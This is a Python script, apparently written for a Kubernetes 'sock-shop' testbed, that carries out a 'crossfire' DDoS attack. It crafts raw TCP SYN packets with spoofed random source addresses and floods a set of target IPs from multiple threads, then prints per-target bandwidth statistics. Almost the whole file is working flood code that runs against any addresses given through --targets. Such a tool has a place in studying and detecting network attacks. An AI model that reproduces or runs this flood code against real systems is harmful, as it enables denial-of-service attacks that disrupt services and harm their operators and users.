#!/usr/bin/env python3

"""
Crossfire DDoS Attack Simulator - Network Level
This script simulates a crossfire attack at the network layer using raw sockets.

Attack Strategy:
1. Generate high-volume TCP SYN floods to decoy pods
2. Saturate network links and bandwidth
3. Cause packet loss and latency for target service
4. Exploit shared network infrastructure
"""

import argparse
import socket
import struct
import random
import time
import threading
from datetime import datetime
import sys

class NetworkCrossfireAttack:
    def __init__(self, target_ips: list, duration: int, packet_rate: int, threads: int, non_interactive: bool = False):
        self.target_ips = target_ips
        self.duration = duration
        self.packet_rate = packet_rate
        self.threads = threads
        self.non_interactive = non_interactive
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None,
            'per_target': {}  # Track per-target metrics for crossfire validation
        }
        self.running = False
        self.lock = threading.Lock()
        
        # Initialize per-target tracking
        for ip in target_ips:
            self.stats['per_target'][ip] = {
                'packets': 0,
                'bytes': 0
            }

    def checksum(self, data):
        """Calculate IP checksum"""
        s = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                s += (data[i] << 8) + data[i + 1]
            else:
                s += data[i]
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def create_ip_header(self, source_ip, dest_ip):
        """Create IP header"""
        # IP header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel will fill this
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # Pack the IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off,
                                ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        return ip_header

    def create_tcp_header(self, source_ip, dest_ip, source_port, dest_port):
        """Create TCP SYN header"""
        # TCP header fields
        tcp_source = source_port
        tcp_dest = dest_port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
        
        # TCP flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        # Pack TCP header
        tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, tcp_dest,
                                 tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
        
        # Pseudo header for checksum
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH',
                          source_address, dest_address,
                          placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_check = self.checksum(psh)
        
        # Repack with correct checksum
        tcp_header = struct.pack('!HHLLBBH',
                                 tcp_source, tcp_dest,
                                 tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags,
                                 tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
        
        return tcp_header

    def generate_packet(self, dest_ip, dest_port):
        """Generate a TCP SYN packet"""
        # Random source IP and port
        source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        source_port = random.randint(1024, 65535)
        
        # Create headers
        ip_header = self.create_ip_header(source_ip, dest_ip)
        tcp_header = self.create_tcp_header(source_ip, dest_ip, source_port, dest_port)
        
        # Combine
        packet = ip_header + tcp_header
        return packet

    def worker(self, worker_id):
        """Worker thread that sends packets"""
        print(f"[Worker {worker_id}] Started")
        
        try:
            # Create raw socket (requires root/CAP_NET_RAW)
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            print(f"[Worker {worker_id}] ERROR: Root privileges required for raw sockets")
            with self.lock:
                self.stats['errors'] += 1
            return
        except Exception as e:
            print(f"[Worker {worker_id}] ERROR: {e}")
            with self.lock:
                self.stats['errors'] += 1
            return
        
        end_time = time.time() + self.duration
        packet_interval = 1.0 / self.packet_rate
        
        while self.running and time.time() < end_time:
            # Select random target
            target_ip = random.choice(self.target_ips)
            target_port = random.choice([80, 8080, 443, 8443])
            
            # Generate and send packet
            try:
                packet = self.generate_packet(target_ip, target_port)
                s.sendto(packet, (target_ip, 0))
                
                with self.lock:
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(packet)
                    self.stats['per_target'][target_ip]['packets'] += 1
                    self.stats['per_target'][target_ip]['bytes'] += len(packet)
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1
            
            # Rate limiting
            time.sleep(packet_interval)
        
        s.close()
        print(f"[Worker {worker_id}] Finished")

    def run(self):
        """Execute the network-level crossfire attack"""
        print(f"\n{'='*60}")
        print(f"Crossfire DDoS Attack - Network Level")
        print(f"{'='*60}")
        print(f"Target IPs: {', '.join(self.target_ips)}")
        print(f"Duration: {self.duration}s")
        print(f"Packet Rate: {self.packet_rate} pkt/s per thread")
        print(f"Threads: {self.threads}")
        print(f"Total Rate: {self.packet_rate * self.threads} pkt/s")
        print(f"\n⚠️  WARNING: This requires root privileges (CAP_NET_RAW)")
        print(f"{'='*60}\n")
        
        if not self.non_interactive:
            input("Press Enter to start the attack (ensure monitoring is ready)...")
        else:
            print("Starting attack...\n")
        
        self.stats['start_time'] = datetime.now()
        self.running = True
        start = time.time()
        
        # Launch worker threads
        workers = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.start()
            workers.append(t)
        
        # Wait for completion
        for t in workers:
            t.join()
        
        self.running = False
        self.stats['end_time'] = datetime.now()
        elapsed = time.time() - start
        
        # Print statistics
        print(f"\n{'='*60}")
        print(f"Attack Complete")
        print(f"{'='*60}")
        print(f"Duration: {elapsed:.2f}s")
        print(f"Packets Sent: {self.stats['packets_sent']}")
        print(f"Bytes Sent: {self.stats['bytes_sent']} ({self.stats['bytes_sent']/1024/1024:.2f} MB)")
        print(f"Actual Rate: {self.stats['packets_sent']/elapsed:.2f} pkt/s")
        print(f"Bandwidth: {(self.stats['bytes_sent']*8/elapsed/1024/1024):.2f} Mbps")
        print(f"Errors: {self.stats['errors']}")
        
        # Print per-target breakdown (crossfire validation)
        if self.stats['per_target']:
            print(f"\n{'='*60}")
            print(f"CROSSFIRE ATTACK VALIDATION (Network Level)")
            print(f"{'='*60}")
            print(f"Per-Target Breakdown (Decoy Traffic Distribution):")
            print(f"")
            
            sorted_targets = sorted(
                self.stats['per_target'].items(),
                key=lambda x: x[1]['packets'],
                reverse=True
            )
            
            for target_ip, metrics in sorted_targets:
                percent = (metrics['packets'] / self.stats['packets_sent'] * 100) if self.stats['packets_sent'] > 0 else 0
                mbps = (metrics['bytes'] * 8 / elapsed / 1024 / 1024)
                print(f"  {target_ip}")
                print(f"    Packets: {metrics['packets']} ({percent:.1f}%)")
                print(f"    Bytes: {metrics['bytes']/1024:.1f} KB")
                print(f"    Bandwidth: {mbps:.2f} Mbps")
            
            print(f"\n✓ Crossfire Characteristics (Network Level):")
            print(f"  - High volume SYN flood to DECOY pod IPs (shown above)")
            print(f"  - Network link and bandwidth saturation")
            print(f"  - Target service (front-end) impacted INDIRECTLY via:")
            print(f"    * Network congestion and packet loss")
            print(f"    * Switch/router buffer exhaustion")
            print(f"    * Shared network infrastructure saturation")
            print(f"\nTo validate crossfire impact, compare target service performance")
            print(f"BEFORE and DURING attack using: python3 crossfire-detector.py")
        
        print(f"{'='*60}\n")

def get_pod_ips(namespace='sock-shop'):
    """Get IPs of pods in the sock-shop namespace"""
    import subprocess
    try:
        result = subprocess.run(
            ['kubectl', 'get', 'pods', '-n', namespace, '-o', 'jsonpath={.items[*].status.podIP}'],
            capture_output=True,
            text=True,
            check=True
        )
        ips = result.stdout.strip().split()
        return ips
    except Exception as e:
        print(f"Error getting pod IPs: {e}")
        return []

def main():
    parser = argparse.ArgumentParser(
        description='Crossfire DDoS Attack Simulator (Network Level)',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument(
        '--targets',
        nargs='+',
        help='Target IP addresses (space-separated). If not provided, will fetch from kubectl'
    )
    parser.add_argument(
        '--duration',
        type=int,
        default=60,
        help='Attack duration in seconds'
    )
    parser.add_argument(
        '--rate',
        type=int,
        default=100,
        help='Packets per second per thread'
    )
    parser.add_argument(
        '--threads',
        type=int,
        default=5,
        help='Number of concurrent threads'
    )
    parser.add_argument(
        '--non-interactive',
        action='store_true',
        help='Run without user prompts'
    )
    
    args = parser.parse_args()
    
    # Get target IPs
    if args.targets:
        target_ips = args.targets
    else:
        print("Fetching pod IPs from sock-shop namespace...")
        target_ips = get_pod_ips()
        if not target_ips:
            print("Error: No target IPs found. Specify manually with --targets")
            sys.exit(1)
        print(f"Found {len(target_ips)} target IPs")
    
    # Validate inputs
    if args.duration <= 0 or args.rate <= 0 or args.threads <= 0:
        print("Error: duration, rate, and threads must be positive integers")
        sys.exit(1)
    
    # Check for root privileges
    import os
    if os.geteuid() != 0:
        print("\n⚠️  WARNING: This script requires root privileges to create raw sockets")
        print("Run with: sudo python3 crossfire-network-level.py")
        sys.exit(1)
    
    # Run attack
    attack = NetworkCrossfireAttack(target_ips, args.duration, args.rate, args.threads, args.non_interactive)
    
    try:
        attack.run()
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        attack.running = False
        sys.exit(0)

if __name__ == '__main__':
    main()
